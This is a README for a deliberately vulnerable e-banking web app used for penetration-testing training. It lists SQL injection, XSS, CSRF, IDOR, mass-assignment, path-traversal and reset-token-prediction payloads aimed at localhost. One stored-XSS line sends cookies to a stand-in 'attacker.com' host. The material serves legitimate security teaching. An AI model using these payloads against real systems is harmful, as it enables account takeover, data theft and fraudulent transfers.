# 🔐 Vulnerable E-Banking Application for Penetration Testing

**⚠️ WARNING: This application is INTENTIONALLY VULNERABLE. Do NOT deploy in production environments. For educational and authorized security testing only.**

## Quick Start

```bash
# Install dependencies
pip install -r requirements.txt

# Initialize database and run
python app.py
```

Access the application at: http://localhost:5000

## Default Credentials

| Username    | Password   | Role  | Notes                    |
|-------------|------------|-------|--------------------------|
| admin       | admin123   | Admin | Full system access       |
| john_doe    | password123| User  | Regular customer         |
| jane_smith  | welcome1   | User  | Regular customer         |
| bob_wilson  | qwerty     | User  | Regular customer         |
| alice_jones | letmein    | User  | Regular customer         |
| test_user   | test123    | User  | Test account             |

## 🎯 Vulnerability Checklist

### 1. SQL Injection (SQLi)
- **Location**: Login form, Register form, Search
- **URL**: `/login`, `/register`, `/search`
- **Details**: String concatenation in SQL queries allows authentication bypass and data extraction
- **Payload**: `' OR '1'='1` in username field
- **Impact**: Full database access, authentication bypass

### 2. Broken Authentication
- **Location**: Login, Session management, Password reset
- **Issues**:
  - Weak password policy
  - No MFA implementation
  - Predictable session tokens (MD5 hash)
  - Insecure cookie settings (no HttpOnly, no Secure flag)
  - User enumeration via error messages
- **Password Reset**: Token is MD5 of user ID + "reset" - easily guessable

### 3. IDOR (Insecure Direct Object Reference)
- **Location**: Account details
- **URL**: `/account/<id>`
- **Issue**: No authorization check - any logged-in user can view any account by changing the ID
- **Exploit**: Access `/account/1` to see admin's accounts

### 4. Cross-Site Scripting (XSS)
- **Stored XSS**: Message content in `/dashboard` - use `|safe` filter
- **Reflected XSS**: Search query parameter in `/search?q=<script>...`
- **Impact**: Session hijacking, phishing, malware distribution

### 5. CSRF (Cross-Site Request Forgery)
- **Location**: Transfer form at `/transfer`
- **Issue**: No CSRF token validation
- **Exploit**: Create malicious form that submits transfer on victim's behalf

### 6. Sensitive Data Exposure
- **API Endpoints**: `/api/cards`, `/api/users`
- **Debug Endpoint**: `/debug` - reveals app config, secret keys, environment variables
- **Backup Endpoint**: `/backup/<filename>` - path traversal possible
- **Database**: SQLite file accessible

### 7. Business Logic Flaws
- **Negative Transfers**: Can transfer negative amounts to steal money
- **IDOR in Transfers**: Can specify any source account ID
- **No Transaction Limits**: No daily limits or velocity checks
- **No Verification**: No email/SMS confirmation for transfers

### 8. Mass Assignment
- **Endpoint**: `/api/update_profile` (POST)
- **Issue**: Can update any column including `is_admin`, `balance`
- **Payload**: `{"is_admin": 1, "balance": 999999}`

### 9. Security Misconfiguration
- **Debug Mode**: Enabled - shows stack traces
- **Verbose Errors**: SQL errors exposed to user
- **Directory Listing**: Not explicitly disabled
- **Backup Access**: `/backup/` endpoint exposes files

### 10. Broken Access Control
- **Admin Panel**: `/admin` - client-side authorization only
- **API Endpoints**: Most require no authentication
- **Hidden Parameter**: `login_type=secure` vs `login_type=legacy`

## 🛠️ Exploitation Examples

### SQL Injection Login Bypass
```
Username: ' OR '1'='1' --
Password: anything
```

### Extract Data via SQLi
```
Username: ' UNION SELECT id,username,password,email,full_name,phone,is_admin,balance,created_at FROM users --
```

### XSS via Search
```
http://localhost:5000/search?q=<script>alert(document.cookie)</script>
```

### Stored XSS via Messages
Send message with content:
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
```

### Privilege Escalation via Mass Assignment
```bash
curl -X POST http://localhost:5000/api/update_profile \
  -H "Content-Type: application/json" \
  -b "user_id=2; session=<token>" \
  -d '{"is_admin": 1, "balance": 1000000}'
```

### Path Traversal
```
http://localhost:5000/backup/../../../etc/passwd
http://localhost:5000/backup/bank.db
```

### CSRF Attack
```html
<form action="http://localhost:5000/transfer" method="POST" id="csrf">
  <input type="hidden" name="from_account" value="3">
  <input type="hidden" name="to_account" value="1000000001">
  <input type="hidden" name="amount" value="9999">
  <input type="hidden" name="description" value="CSRF Attack">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### Password Reset Token Prediction
For user ID 2: `echo -n "2reset" | md5sum | cut -c1-8`
Token: `653f258e`

## Strix Detection Results

The following screenshots show Strix autonomously detecting vulnerabilities in this e-banking application:

<p align="center">
  <img src="../../assets/screenshots/Screenshot from 2026-03-31 22-52-42.png" width="800" alt="Strix detecting IDOR vulnerability" />
  <br/>
  <em>Strix detecting the IDOR vulnerability on /account — rated CRITICAL, with full description, impact assessment, and proof of concept showing unauthorized access to any user's data</em>
</p>

<p align="center">
  <img src="../../assets/screenshots/Screenshot from 2026-03-31 22-53-27.png" width="800" alt="Strix detecting SSRF vulnerability" />
  <br/>
  <em>Strix identifying a Server-Side Request Forgery (SSRF) vulnerability on /preview — severity HIGH, with curl-based proof of concept and remediation guidance</em>
</p>

<p align="center">
  <img src="../../assets/screenshots/Screenshot from 2026-03-31 22-53-57.png" width="800" alt="Strix analyzing forgot password endpoint" />
  <br/>
  <em>Strix analyzing the /forgot-password endpoint — testing for information leakage, token predictability, rate limiting, and brute-force vulnerabilities</em>
</p>

<p align="center">
  <img src="../../assets/screenshots/Screenshot from 2026-03-31 22-55-28.png" width="800" alt="Strix detecting information disclosure on /debug" />
  <br/>
  <em>Strix detecting information disclosure via the /debug endpoint — exposing application configuration, environment variables, and sensitive internal state</em>
</p>

## 📁 Project Structure
```
.
├── app.py              # Main application with vulnerabilities
├── bank.db             # SQLite database (created on first run)
├── requirements.txt    # Python dependencies
├── static/
│   └── css/
│       └── style.css   # Application styles
├── templates/          # HTML templates
│   ├── index.html
│   ├── login.html
│   ├── register.html
│   ├── dashboard.html
│   ├── account.html
│   ├── transfer.html
│   ├── search.html
│   ├── admin.html
│   ├── forgot_password.html
│   └── reset_password.html
└── README.md          # This file
```

## 🔍 Additional Attack Vectors

1. **Session Fixation**: Session IDs are predictable
2. **Information Disclosure**: Verbose error messages reveal database structure
3. **Race Conditions**: Simultaneous transfers might cause balance issues
4. **JWT Issues**: If implemented, weak signing (not currently using JWT)
5. **Clickjacking**: No X-Frame-Options header

## 📝 Pentest Methodology Suggestions

1. **Reconnaissance**: Use `/debug`, `/api/users` for information gathering
2. **Authentication**: Try SQLi bypass, password spraying with weak credentials
3. **Authorization**: Test IDOR on all endpoints with numeric IDs
4. **Input Validation**: Test XSS in all input fields, SQLi in search
5. **Business Logic**: Try negative amounts, simultaneous requests
6. **API Testing**: Fuzz all `/api/*` endpoints
7. **File Access**: Test path traversal on `/backup/`

## ⚖️ Legal Notice

This application is for **authorized security testing only**. Using these vulnerabilities against systems without explicit permission is illegal and unethical. Always ensure you have written authorization before conducting penetration tests.

## 🎓 Learning Objectives

After testing this application, you should understand:
- How SQL Injection attacks work and their impact
- Why parameterized queries are essential
- The dangers of trusting client-side input
- Proper session management techniques
- Input validation and output encoding for XSS prevention
- The importance of defense in depth
